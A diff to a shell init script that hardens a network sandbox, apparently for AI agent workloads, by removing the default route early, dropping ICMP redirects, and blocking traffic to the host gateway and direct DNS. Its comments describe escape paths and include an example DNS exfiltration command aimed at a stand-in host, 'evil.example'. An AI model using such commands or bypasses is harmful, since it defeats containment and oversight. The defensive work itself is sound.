@@ -9,6 +9,11 @@
 # iptables, no jq, no secrets.
 #
 # Stages:
+#   0. Fail closed: remove the boot-time default route via the vmnet host
+#      gateway, so nothing leaves the cage before stage B, and drop ICMP
+#      redirects for the life of the cage.
+#   0'. Lock down the OUTPUT chain: no TCP/UDP to the host gateway, and
+#      UDP :53 only from the in-cage dnsmasq.
 #   A. Wait for the egress sibling to be ARP-reachable. Apple's container
 #      network plugin is eventually-consistent; without this wait the
 #      `ip route replace default` below can succeed before the L2 path
@@ -26,8 +31,8 @@
 #      cage-cmd.sh — shlex.quote'd host-side so no metacharacter risk).
 #
 # Runs as root with --cap-add CAP_NET_ADMIN granted at container run.
-# CAP_NET_ADMIN is needed for stage B's `ip route replace`; capsh drops
-# it before the workload runs.
+# CAP_NET_ADMIN is needed for stage 0's `ip route del` and stage B's
+# `ip route replace`; capsh drops it before the workload runs.
 #
 # POSIX sh, not bash — Apple's `container run` execs us directly without
 # a login shell; we must not depend on bash-isms.
@@ -35,6 +40,105 @@ set -eu
 
 log() { printf '[cage-init] %s\n' "$*" >&2; }
 die() { log "FATAL: $1"; exit "${2:-99}"; }
+
+#-- Stage 0. Fail closed until stage B -------------------------------------
+# apple-container boots this microVM with a default route via the vmnet
+# host gateway (<subnet>.1), which NATs straight to the internet. Stage B
+# moves it to the egress sibling, but only after stage A's wait and stage
+# A''s DNS setup, and a `cage exec` session can start as soon as the
+# microVM is up. Anything sent in that gap left the cage directly: no
+# allowlist, no secret injection, no audit. Remove the route before
+# anything else, so until stage B off-subnet traffic fails with "Network
+# is unreachable" instead. The subnet route stays, so stage A can still
+# reach the egress sibling.
+#
+# Then refuse ICMP redirects for the life of the cage. A redirect from
+# the egress sibling (see the OUTPUT rule in supervisor-egress.sh for how
+# one comes about) names the host gateway as the better first hop for a
+# destination, and Linux honours that for five minutes: new connections
+# to that host would leave through the gateway again, past the egress.
+# /proc/sys is read-only in this microVM, so accept_redirects cannot be
+# switched off; dropping redirects at INPUT, which runs before the kernel
+# acts on one, does the same.
+log "stage 0: removing the boot-time default route until stage B; dropping ICMP redirects"
+i=0
+while [ -n "$(ip -4 route show default 2>/dev/null)" ] && [ "$i" -lt 8 ]; do
+  ip -4 route del default 2>/dev/null || true
+  i=$((i + 1))
+done
+[ -z "$(ip -4 route show default 2>/dev/null)" ] \
+  || die "failed to remove the boot-time default route via the host gateway — CAP_NET_ADMIN missing?" 2
+if command -v iptables >/dev/null 2>&1; then
+  iptables -A INPUT -p icmp --icmp-type redirect -j DROP \
+    || log "warn: iptables ICMP redirect DROP failed — a redirect could route a destination around the egress"
+else
+  log "warn: iptables missing — ICMP redirects are honoured, so a redirect could route a destination around the egress"
+fi
+if command -v ip6tables >/dev/null 2>&1; then
+  ip6tables -A INPUT -p ipv6-icmp --icmpv6-type redirect -j DROP \
+    || log "warn: ip6tables ICMPv6 redirect DROP failed"
+fi
+
+#-- Stage 0'. Lock down the OUTPUT chain ---------------------------------
+# Two cage→outside abuse paths get closed here. They are closed before
+# stage A, with stage 0, because the host gateway is on the cage's own
+# subnet: removing the default route does not stop the gap before stage
+# B from reaching it.
+#
+# (1) Cage→macOS-host services. Apple's container runtime puts the
+#     host on the cage's vmnet subnet at the .1 address; the host's
+#     loopback services (sshd :22, Apple Remote Desktop :5900) are
+#     reachable directly via that gateway — completely outside the
+#     egress proxy, which only intercepts :80/:443 via PREROUTING
+#     REDIRECT. The cage has no legitimate reason to talk to that
+#     gateway at all: HTTPS goes via the egress sibling, DNS via the
+#     in-cage dnsmasq on loopback (stage A'). DROP all TCP + UDP to
+#     the gateway IP.
+#
+# (2) Workload-originated DNS exfil. Even with the in-cage dnsmasq
+#     scoped to the per-cage allowlist, a uid-1000 process could
+#     bypass it by sending UDP :53 directly to ANY external resolver
+#     (e.g. `dig @1.1.1.1 evil.example`) — the scoped dnsmasq is
+#     decorative if the workload can just pick a different server.
+#     Restrict UDP :53 to packets originated by the in-cage dnsmasq
+#     (acdns, uid 201) via the xt_owner module. Cage exec --user 0
+#     still can't unstick this because the cage exec wrapper drops
+#     CAP_NET_ADMIN before exec, so root can't `iptables -F`.
+#
+# Derive the apple-vmnet host IP as <subnet>.1 — apple-container
+# always assigns the host the first usable address on the bridge
+# subnet; our default route via the egress sibling sits elsewhere
+# on the same /24. Anchoring on the cage's own eth0 IP keeps this
+# robust if apple changes the default subnet allocation later.
+_local_ip=$(ip -o -4 addr show eth0 2>/dev/null \
+  | awk '/inet / {sub(/\/.*/,"",$4); print $4; exit}')
+_apple_host_gw=$(printf '%s\n' "${_local_ip}" \
+  | awk -F. 'NF==4 {print $1"."$2"."$3".1"}')
+if [ -n "${_apple_host_gw}" ] && command -v iptables >/dev/null 2>&1; then
+  log "stage 0': dropping cage→host-gateway ${_apple_host_gw} (all TCP/UDP); restricting outbound UDP :53 to the in-cage dnsmasq uid"
+  iptables -A OUTPUT -d "${_apple_host_gw}" -p tcp -j DROP \
+    || log "warn: iptables TCP DROP rule for ${_apple_host_gw} failed (cage→host SSH/ARD remains reachable)"
+  iptables -A OUTPUT -d "${_apple_host_gw}" -p udp -j DROP \
+    || log "warn: iptables UDP DROP rule for ${_apple_host_gw} failed"
+  # Only the in-cage dnsmasq (acdns, uid 201) may originate UDP :53
+  # to external resolvers. Loopback traffic is allowed first so the
+  # workload's regular `getent` / `socket.gethostbyname` lookups reach
+  # the local dnsmasq on 127.0.0.1:53 — otherwise the uid-owner rule
+  # would catch them too (uid 1000 → dst :53 → DROP) and break all
+  # DNS in the cage. Without the loopback exemption, the only way to
+  # query DNS would be `dig @127.0.0.1` running as acdns, which no
+  # workload does.
+  #
+  # If acdns wasn't created (wrapper image without dnsmasq) the
+  # DROP rule still installs and blocks ALL non-loopback UDP :53 —
+  # safer than leaving the exfil channel open silently.
+  iptables -A OUTPUT -o lo -p udp --dport 53 -j ACCEPT \
+    || log "warn: iptables loopback :53 ACCEPT failed — workload DNS may break"
+  iptables -A OUTPUT -p udp --dport 53 -m owner ! --uid-owner 201 -j DROP \
+    || log "warn: iptables UDP-53 uid-owner DROP failed — workload can DNS-tunnel via direct UDP :53 to any resolver"
+else
+  log "warn: cannot derive apple-vmnet gateway IP or iptables missing — cage→host lockdown skipped"
+fi
 
 #-- Stage A. Wait for egress sibling reachable -----------------------------
 # AGENTCAGE_EGRESS_IP is passed by the backend's `start()` after reading
@@ -181,64 +285,6 @@ fi
 log "stage B: setting default route via ${AGENTCAGE_EGRESS_IP}"
 ip route replace default via "${AGENTCAGE_EGRESS_IP}" \
   || die "failed to set default route via ${AGENTCAGE_EGRESS_IP} — CAP_NET_ADMIN missing?" 2
-
-#-- Stage B'. Lock down the OUTPUT chain ----------------------------------
-# Two cage→outside abuse paths get closed here.
-#
-# (1) Cage→macOS-host services. Apple's container runtime puts the
-#     host on the cage's vmnet subnet at the .1 address; the host's
-#     loopback services (sshd :22, Apple Remote Desktop :5900) are
-#     reachable directly via that gateway — completely outside the
-#     egress proxy, which only intercepts :80/:443 via PREROUTING
-#     REDIRECT. The cage has no legitimate reason to talk to that
-#     gateway at all: HTTPS goes via the egress sibling, DNS via the
-#     in-cage dnsmasq on loopback (stage A'). DROP all TCP + UDP to
-#     the gateway IP.
-#
-# (2) Workload-originated DNS exfil. Even with the in-cage dnsmasq
-#     scoped to the per-cage allowlist, a uid-1000 process could
-#     bypass it by sending UDP :53 directly to ANY external resolver
-#     (e.g. `dig @1.1.1.1 evil.example`) — the scoped dnsmasq is
-#     decorative if the workload can just pick a different server.
-#     Restrict UDP :53 to packets originated by the in-cage dnsmasq
-#     (acdns, uid 201) via the xt_owner module. Cage exec --user 0
-#     still can't unstick this because the cage exec wrapper drops
-#     CAP_NET_ADMIN before exec, so root can't `iptables -F`.
-#
-# Derive the apple-vmnet host IP as <subnet>.1 — apple-container
-# always assigns the host the first usable address on the bridge
-# subnet; our default route via the egress sibling sits elsewhere
-# on the same /24. Anchoring on the cage's own eth0 IP keeps this
-# robust if apple changes the default subnet allocation later.
-_local_ip=$(ip -o -4 addr show eth0 2>/dev/null \
-  | awk '/inet / {sub(/\/.*/,"",$4); print $4; exit}')
-_apple_host_gw=$(printf '%s\n' "${_local_ip}" \
-  | awk -F. 'NF==4 {print $1"."$2"."$3".1"}')
-if [ -n "${_apple_host_gw}" ] && command -v iptables >/dev/null 2>&1; then
-  log "stage B': dropping cage→host-gateway ${_apple_host_gw} (all TCP/UDP); restricting outbound UDP :53 to the in-cage dnsmasq uid"
-  iptables -A OUTPUT -d "${_apple_host_gw}" -p tcp -j DROP \
-    || log "warn: iptables TCP DROP rule for ${_apple_host_gw} failed (cage→host SSH/ARD remains reachable)"
-  iptables -A OUTPUT -d "${_apple_host_gw}" -p udp -j DROP \
-    || log "warn: iptables UDP DROP rule for ${_apple_host_gw} failed"
-  # Only the in-cage dnsmasq (acdns, uid 201) may originate UDP :53
-  # to external resolvers. Loopback traffic is allowed first so the
-  # workload's regular `getent` / `socket.gethostbyname` lookups reach
-  # the local dnsmasq on 127.0.0.1:53 — otherwise the uid-owner rule
-  # would catch them too (uid 1000 → dst :53 → DROP) and break all
-  # DNS in the cage. Without the loopback exemption, the only way to
-  # query DNS would be `dig @127.0.0.1` running as acdns, which no
-  # workload does.
-  #
-  # If acdns wasn't created (wrapper image without dnsmasq) the
-  # DROP rule still installs and blocks ALL non-loopback UDP :53 —
-  # safer than leaving the exfil channel open silently.
-  iptables -A OUTPUT -o lo -p udp --dport 53 -j ACCEPT \
-    || log "warn: iptables loopback :53 ACCEPT failed — workload DNS may break"
-  iptables -A OUTPUT -p udp --dport 53 -m owner ! --uid-owner 201 -j DROP \
-    || log "warn: iptables UDP-53 uid-owner DROP failed — workload can DNS-tunnel via direct UDP :53 to any resolver"
-else
-  log "warn: cannot derive apple-vmnet gateway IP or iptables missing — cage→host lockdown skipped"
-fi
 
 #-- Stage C. Install proxy CA into the cage's trust store -----------------
 # The egress sibling writes agentcage-ca.pem into the shared /certs
